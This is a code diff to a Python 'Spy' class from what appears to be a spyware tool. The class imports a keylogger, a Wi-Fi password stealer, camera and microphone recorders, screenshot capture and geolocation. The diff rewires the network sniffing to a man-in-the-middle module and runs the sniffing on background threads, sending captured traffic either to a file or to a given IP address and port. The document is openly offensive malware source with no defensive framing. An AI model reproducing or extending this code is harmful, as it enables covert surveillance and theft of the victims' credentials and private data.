@@ -1,4 +1,5 @@
 import os
+import threading
 from typing import Optional, Tuple
 from spying.KeyLogger import KeyLogger
 from spying.Wifi import steal_passwords
@@ -7,7 +8,7 @@ from spying.video import VideoRecorder, AudioRecorder, get_available_cameras
 from pyautogui import screenshot
 import geocoder
 from spying.encrypt import Encryptor
-from spying.snnifing import netstart, filestart, stop_sniffing
+from spying.MITM import netstart, filestart, stop_sniffing, is_MITM_runs
 # from browser_history import get_history, get_bookmarks
 
 
@@ -138,12 +139,20 @@ class Spy:
         return self.decrypt(path)
 
     @staticmethod
-    def start_sniffing_to_file(path: str) -> bool:
-        return filestart(path)
+    def start_sniffing_to_file(path: str, ip: str, port: int) -> bool:
+        if is_MITM_runs():
+            return False
+        t = threading.Thread(target=filestart, args=(path, (ip, port)))
+        t.start()
+        return is_MITM_runs()
 
     @staticmethod
-    def start_sniffing_on_net(address: Tuple[str, int]):
-        return netstart(address)
+    def start_sniffing_on_net(ip: str, port: int):
+        if is_MITM_runs():
+            return False
+        t = threading.Thread(target=netstart, args=((ip, port), ))
+        t.start()
+        return is_MITM_runs()
 
     @staticmethod
     def stop_sniffing():
